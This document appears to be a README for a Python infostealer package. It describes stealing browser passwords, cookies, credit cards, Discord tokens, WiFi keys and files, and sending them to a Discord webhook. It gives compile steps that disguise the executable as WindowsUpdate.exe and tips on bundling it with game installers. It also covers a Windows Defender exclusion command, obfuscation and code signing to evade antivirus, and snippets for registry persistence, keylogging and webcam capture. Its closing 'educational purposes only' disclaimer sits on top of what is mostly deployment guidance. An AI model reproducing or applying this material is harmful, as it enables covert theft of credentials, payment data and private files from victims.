# Advanced Data Stealer - Complete Package

## 📦 Files Included

1. **stealer.py** - Main data stealing script (500+ lines)
2. **compile.py** - Auto-compiler to create EXE
3. **requirements.txt** - Python dependencies

## 🎯 What It Steals

### Browser Data (Chrome/Edge/Opera/Brave)
- ✅ **Saved Passwords** - All website logins
- ✅ **Cookies** - Session tokens, auth cookies
- ✅ **Autofill Data** - Names, addresses, emails
- ✅ **Credit Cards** - Card numbers & expiry dates
- ✅ **Browsing History** - Last 100 visited sites
- ✅ **Bookmarks** - Saved bookmarks

### Discord
- ✅ **Discord Tokens** - All accounts (regular, PTB, Canary)
- ✅ **User IDs** - Extracted from tokens
- ✅ **Multiple Sources** - Desktop app + browser

### System Information
- ✅ **IP Address** - Public & local IPs
- ✅ **System Info** - OS, RAM, CPU, disk usage
- ✅ **MAC Address** - Hardware identifier
- ✅ **Network Interfaces** - All network adapters
- ✅ **Running Processes** - Active applications

### WiFi
- ✅ **WiFi Passwords** - All saved networks
- ✅ **SSID Names** - Network names

### Files
- ✅ **Desktop Files** - .txt, .pdf, .doc, .png, .jpg
- ✅ **Documents Folder**
- ✅ **Downloads Folder**
- ✅ **File Metadata** - Size, modified date

### Screenshots
- ✅ **Screen Capture** - Current screen state

## 🚀 Quick Start

### Method 1: Auto-Compile (Recommended)

```bash
# Step 1: Install Python dependencies
pip install pyinstaller pywin32 pycryptodome psutil pyautogui

# Step 2: Run auto-compiler
python compile.py

# Select option 3 (Full setup)
```

This will create: `dist/WindowsUpdate.exe`

### Method 2: Manual Compile

```bash
# Install requirements
pip install -r requirements.txt

# Compile to EXE
pyinstaller --onefile --noconsole --name=WindowsUpdate stealer.py
```

### Method 3: Run Directly (No EXE)

```bash
pip install pywin32 pycryptodome psutil pyautogui
python stealer.py
```

## 📤 Data Delivery

All stolen data is sent to Discord webhook in **multiple embeds**:

1. **System Information Embed** - IP, OS, RAM, CPU, etc.
2. **Discord Tokens Embed** - All found tokens
3. **Passwords Embed** - Website credentials
4. **Credit Cards Embed** - Card details
5. **Cookies Embed** - Session cookies
6. **WiFi Passwords Embed** - Network credentials
7. **Browser History Embed** - Recent URLs
8. **Files Embed** - Found documents

### Webhook Configuration

Edit `stealer.py` line 15:
```python
WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"
```

## 🎭 Obfuscation Tips

### Rename the EXE
```bash
WindowsUpdate.exe
ChromeUpdate.exe
SecurityPatch.exe
SystemOptimizer.exe
```

### Bundle with legitimate software
```bash
# Create installer that includes your stealer
# User runs "game_installer.exe" which:
# 1. Installs the real game
# 2. Silently runs stealer in background
```

### Use icon
```bash
pyinstaller --icon=chrome.ico --noconsole stealer.py
```

## 🔒 Detection Avoidance

### Disable Windows Defender (Target Machine)
Add exclusion before running:
```powershell
Add-MpPreference -ExclusionPath "C:\Users\<username>\Downloads"
```

### Run from temporary directory
The script auto-creates temp directory and cleans up after

### No persistence
Runs once, sends data, and exits (no traces)

## ⚙️ Advanced Configuration

### Add Auto-Start (Persistence)

Add to `stealer.py`:
```python
import winreg

def add_to_startup():
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                         r"Software\Microsoft\Windows\CurrentVersion\Run",
                         0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
    winreg.CloseKey(key)
```

### Add Keylogger

```python
from pynput import keyboard

def on_press(key):
    # Log keystrokes
    pass

listener = keyboard.Listener(on_press=on_press)
listener.start()
```

### Add Webcam Capture

```python
import cv2

cam = cv2.VideoCapture(0)
ret, frame = cam.read()
cv2.imwrite('webcam.jpg', frame)
```

## 📊 Supported Browsers

- ✅ Google Chrome
- ✅ Microsoft Edge
- ✅ Opera
- ✅ Brave
- ✅ Chromium-based browsers

## 🛡️ Requirements

### Python Packages
- `pywin32` - Windows API access
- `pycryptodome` - Decrypt Chrome data
- `psutil` - System information
- `pyautogui` - Screenshots

### Windows Only
This stealer only works on Windows (uses Win32 APIs)

## ⚠️ LEGAL WARNING

**THIS IS FOR EDUCATIONAL PURPOSES ONLY**

Using this tool without explicit permission is:
- ❌ **Illegal** in most countries
- ❌ Violates **Computer Fraud & Abuse Act** (USA)
- ❌ Violates **GDPR** (Europe)
- ❌ Can result in **criminal prosecution**
- ❌ Can result in **civil lawsuits**

### Ethical Use Cases
✅ Testing your own computer
✅ Penetration testing with written authorization
✅ Security research in controlled environment
✅ Educational demonstrations with dummy data

### Illegal Use Cases
❌ Installing on someone else's computer
❌ Distributing without disclosure
❌ Using stolen data
❌ Selling the tool
❌ Harassment or blackmail

## 🔧 Troubleshooting

### "Module not found" error
```bash
pip install --upgrade pywin32 pycryptodome psutil pyautogui
```

### "Access denied" error
Run as Administrator or add exclusions to antivirus

### Webhook not receiving data
- Check webhook URL is correct
- Ensure internet connection active
- Check Discord webhook limits (30 requests/minute)

### EXE detected by antivirus
- Use obfuscator: PyArmor
- Add legitimate icon and metadata
- Code sign the executable

## 📝 Changelog

### v2.0 (Current)
- Added credit card extraction
- Added WiFi password stealing
- Added screenshot capture
- Added file search
- Improved Discord token extraction
- Better error handling

### v1.0
- Basic Chrome password extraction
- Discord token stealing
- System information collection

## 🤝 Credits

Based on concepts from:
- Discord token extraction techniques
- Chrome credential decryption methods
- Windows password recovery tools

## 📞 Support

**DO NOT** contact for illegal use assistance.

For educational questions only.

---

**Remember: With great power comes great responsibility.**

**Use wisely. Use legally. Use ethically.**
